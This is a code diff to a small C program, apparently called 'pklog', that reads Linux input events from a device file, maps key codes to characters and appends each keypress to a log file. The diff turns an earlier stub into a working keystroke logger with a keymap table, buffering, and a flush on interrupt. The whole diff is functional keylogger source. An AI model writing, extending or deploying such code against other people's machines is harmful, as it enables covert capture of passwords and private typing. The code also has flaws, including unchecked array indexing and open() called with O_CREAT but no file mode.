@@ -2,18 +2,30 @@
 #include <fcntl.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <signal.h>
 #include <linux/input.h>
 
 #define BUFFER_SZ 32
 
+const char *const key_values[84] = {"", "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BCKSPC]", "[TB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "[ENTER]", "[LCTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "´", "`", "[LSHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[RSHIFT]", "*", "[LALT]", " ", "[CAPSLOCK]", "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", "."};
+
+const int key_values_sz[84] = {0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 6, 1, 10, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 9, 12, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1};
+
+static inline void verify_buffer (void);
+static inline void write_buffer (void);
+static inline void interrupt ();
+
+/*Globals*/
+int infd, outfd;
+int buffer_counter;
+int buffer[BUFFER_SZ];
+
 int main (int argc, char **argv)
 {
 	struct input_event key;
-	char *buffer = malloc (BUFFER_SZ*sizeof(char));
-	char *input = NULL;
-	char *output = "output";
+	const char *input = NULL;
+	const char *output = NULL;
 	int opt;
-	int infp, outfp;
 
 	while ( (opt = getopt (argc, argv, "d:o:")) != -1 ) {
 		switch (opt) {
@@ -29,18 +41,54 @@ int main (int argc, char **argv)
 		}
 	}
 
-	/* opens input */
-	infp = open (input, O_RDONLY);
+	if (input  == NULL || output == NULL) {
+		printf ("Error: You need to specify the input and output files!\n\t pklog -h for help\n");
+		return 0;
+	}
+	else {
+		/* open input */
+		infd = open (input, O_RDONLY);
 
-	/* opens output */
-	outfp = open (output, O_WRONLY | O_CREAT | O_APPEND);
-
-	while (1) {
-		read (infp, &key, sizeof(struct input_event));
-		if (key.type == 1)
-			printf ("Tecla pressionada\n");
+		/* open output */
+		outfd = open (output, O_WRONLY | O_CREAT | O_APPEND);
 	}
 
+	signal (SIGINT, interrupt);
+
+	buffer_counter = 0;
+
+	while (1) {
+		read (infd, &key, sizeof(struct input_event));
+		if (key.type == 1 && key.value == 1) {
+			buffer[buffer_counter++] = key.code;
+			verify_buffer ();
+		}
+	}
+
+	close (infd);
+	close (outfd);
 
 	return 0;
+}
+
+static inline void verify_buffer (void)
+{
+	if (buffer_counter == BUFFER_SZ) {
+		write_buffer ();
+		buffer_counter = 0;
+	}
+}
+
+static inline void write_buffer (void)
+{
+	int i;
+	for (i = 0; i < buffer_counter; i++)
+		write (outfd, key_values[buffer[i]], key_values_sz[buffer[i]]);	
+}
+
+
+static inline void interrupt ()
+{
+	write_buffer ();
+	exit (-1);
 }
